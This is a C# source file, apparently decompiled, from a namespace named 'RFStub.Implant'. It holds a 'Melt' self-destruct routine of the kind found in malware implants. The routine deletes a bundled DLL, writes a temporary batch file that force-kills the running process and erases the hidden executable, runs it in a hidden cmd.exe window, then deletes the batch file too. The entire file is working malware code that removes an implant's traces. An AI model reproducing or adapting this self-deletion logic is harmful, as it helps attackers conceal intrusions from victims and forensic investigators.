using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Threading;

namespace RFStub.Implant;

internal sealed class SelfDestruct
{
	public static void Melt()
	{
		string text = Path.GetTempFileName() + ".bat";
		string location = Assembly.GetExecutingAssembly().Location;
		int id = Process.GetCurrentProcess().Id;
		string path = "DotNetZip.dll";
		if (File.Exists(path))
		{
			try
			{
				File.Delete(path);
			}
			catch
			{
			}
		}
		using (StreamWriter streamWriter = File.AppendText(text))
		{
			streamWriter.WriteLine("chcp 65001");
			streamWriter.WriteLine("TaskKill /F /IM " + id);
			streamWriter.WriteLine("Timeout /T 2 /Nobreak");
			streamWriter.WriteLine("Del /ah \"" + location + "\"");
		}
		Process.Start(new ProcessStartInfo
		{
			FileName = "cmd.exe",
			Arguments = "/C " + text + " & Del " + text,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		});
		Thread.Sleep(5000);
		Environment.FailFast(null);
	}
}
